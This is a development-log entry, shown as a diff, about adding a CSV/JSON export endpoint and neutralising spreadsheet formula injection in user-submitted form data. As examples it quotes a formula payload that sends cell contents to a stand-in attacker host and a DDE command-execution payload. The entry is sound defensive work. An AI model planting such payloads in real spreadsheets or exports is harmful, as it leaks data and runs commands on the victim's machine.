@@ -10268,3 +10268,46 @@ design … near-black #08070c"**. `styles.css` has said the opposite since 2026-
 platform (owner): high-contrast light, white surfaces, near-black ink" — so the doc was five days
 stale on the single most visible fact about the product, and my first render came out dark-on-dark
 because of it. Fixed, and pointed at `styles.css` as the authority so the next drift is obvious.
+
+---
+
+## 2026-07-28 — getting the data out, and the bug hiding in a CSV
+
+The Backups panel has had a working download button since the D1 era, wired to
+`/api/site/backend/export` — deleted 2026-07-27. So a barber shop's bookings could be read on screen
+and never got out of the building. `GET /api/site/<slug>/export?table=<t>&format=csv|json`, same gate
+as everything else.
+
+**The interesting part of a CSV export is not the commas.**
+
+A `collect` table is, by definition, text a stranger typed into a form. Excel, LibreOffice and Google
+Sheets all treat a cell beginning `=`, `+`, `-` or `@` as a **formula** and evaluate it on open. So a
+booking whose notes read
+
+```
+=HYPERLINK("https://evil.example/?"&A1,"Click for your receipt")
+```
+
+builds a live link out of the neighbouring cell the moment the owner opens the file — and
+`=cmd|'/c calc'!A1` is worse. The person attacked is the **owner**, by their own spreadsheet, using
+data our own API handed them.
+
+**Quoting does not fix this.** The CSV parser strips the quotes before the formula parser ever sees
+the cell. The value has to stop being a formula, so it is prefixed with `'`, which those programs
+read as "this is text".
+
+`-` is handled narrowly and deliberately: it is a real trigger (`-1+1` evaluates) but it is also how
+every negative number and plenty of dates begin. Blanket-prefixing would corrupt ordinary data in the
+common case to defend against the rare one — so a value that is simply a number is left alone, and
+anything else that starts dangerously is neutralised. Both halves are tested.
+
+Two smaller calls: the column list is `id`, `created_at`, the declared columns, **and then anything
+the rows really have that the schema never named** — an export that silently drops a column is not a
+backup. And `attachment`, never `inline`: owner-supplied text must not render as a document on our
+own origin.
+
+One of my own test expectations was wrong again and worth noting, because it is the same shape as
+last time: I asserted that a mid-value `\r` would be neutralised. It should not be — a control
+character only triggers the formula guard when it LEADS. The code was right; the test was wrong.
+
+Unit suite **454**, 24/24 mutations on the export.
